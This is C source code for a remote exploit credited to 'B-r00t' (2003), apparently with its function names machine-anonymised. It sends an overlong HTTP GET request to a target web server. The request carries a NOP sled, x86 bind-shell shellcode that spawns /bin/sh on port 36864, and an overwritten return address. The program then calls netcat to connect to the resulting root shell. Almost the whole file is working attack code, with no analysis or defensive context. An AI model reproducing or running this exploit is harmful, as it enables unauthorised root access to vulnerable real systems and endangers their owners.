#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {char sin_zero; int /*<<< orphan*/  sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  shellcode ;
typedef  int /*<<< orphan*/  buf ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  DEST_PORT ; 
 char* EXPLOIT ; 
 char* NOP ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int FUNC1 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int FUNC8 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 int FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (char*,char*) ; 
 int FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 

int FUNC15 ( int argc, char *argv[] )
{

// Vars 
int socketfd, loop, bytes;
struct sockaddr_in dest_addr;
char *TARGET = "TARGET";
char buf[2100], *ptr;
// Big fat slide NOP so ret should be good everywhere!
char ret[] = "\xe8\xc5\xff\xbe\xe8\xc5\xff\xbe";
char shellcode[] =
"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
"\x40\x89\xc3\x89\x46\x0c\x40\x89"
"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
"\x80\x43\xc6\x46\x10\x10\x88\x46"
"\x08\x31\xc0\x31\xd2\x89\x46\x18"
"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
"\x56\x10\xb0\x66\x43\xcd\x80\x86"
"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
"\x80\x88\x56\x07\x89\x76\x0c\x87"
"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
"\xe8\x8d\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";


FUNC7 ("\n%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003\n", EXPLOIT);

if (argc < 2) 
{
        FUNC7 ("\nUsage: %s [IP_ADDRESS]", EXPLOIT);
        FUNC7 ("\nExample: %s 10.0.0.1 \n", EXPLOIT);
        FUNC7 ("\nOn success a r00tshell will be spawned on port 36864.\n\n");
        FUNC2 (-1);
}

FUNC9 (TARGET, argv[1], 1);

// Build buf
FUNC5 (buf, '\0', sizeof (buf));
ptr = buf;
FUNC12 (buf, "GET /");

for (loop = 1; loop < 2033-sizeof(shellcode); loop++) 
FUNC12 (buf, NOP);

FUNC12 (buf, shellcode);
FUNC12 (buf, ret);
FUNC12 (buf, " HTTP/1.0");
FUNC12 (buf, "\x0D\x0A\x0D\x0A");

// Socket
if ((socketfd = FUNC11(AF_INET, SOCK_STREAM, 0)) == -1){
        FUNC6("\nsocket error\n");
        FUNC2 (1);
        }

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = FUNC3(DEST_PORT);
if (! FUNC4(argv[1], &(dest_addr.sin_addr))) {
        FUNC6("inet_aton problems");
        FUNC2 (2);
        }

FUNC5( &(dest_addr.sin_zero), '\0', 8);

if (FUNC1 (socketfd, (struct sockaddr *)&dest_addr, sizeof (struct sockaddr)) == -1){
        FUNC6("\nconnect failed\n");
        FUNC0 (socketfd);
        FUNC2 (3);
        }

// Wallop!
bytes = (FUNC8 (socketfd, ptr, FUNC13(buf), 0));
if (bytes == -1) {
        FUNC6("\nsend error\n");
        FUNC0 (socketfd);
        FUNC2(4);
        }
FUNC0 (socketfd);
if (bytes < FUNC13(buf))
FUNC7 ("\nNetwork Error - Full Payload Was NOT sent!");

FUNC7 ("\n\nNumber of bytes sent: %d / %d\n", bytes, FUNC13(buf));
FUNC7 ("\nUsing netcat 'nc' to get the r00tshell on port 36864 ...!\n");
FUNC10 (3);
FUNC14("nc -vv ${TARGET} 36864 || echo 'Sorry Exploit failed!'");
FUNC2 (0);
}